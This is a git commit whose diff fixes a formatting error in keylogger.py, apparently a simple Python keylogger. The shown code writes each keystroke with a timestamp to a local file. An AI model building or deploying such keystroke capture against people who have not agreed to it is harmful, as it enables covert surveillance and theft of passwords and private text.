9788cdfb9a640a0c28d4dbd20b4a52126c47c18a
ikaaaa21 <himikakaur21@gmail.com>
2025-03-02 21:11:53 +0000

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -15,7 +15,6 @@ def when_pressed(key): #This function is called everytime a key is pressed. Key 
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Get current time in the format "YYYY-MM-DD HH:MM:SS" it will log the keystroke with the timestamp.
     try: 
         with open("keylog.txt" , "a", encoding="utf-8") as file: 
-            file.write(f  "{timestamp} : {char}\n") # Write the keystroke to the file. 'with' keyword it releases the memory automatically
+            file.write(f"{timestamp} : {char}\n") # Write the keystroke to the file. 'with' keyword it releases the memory automatically
     except Exception as e:
         print(f"Error: {e}")    
-        
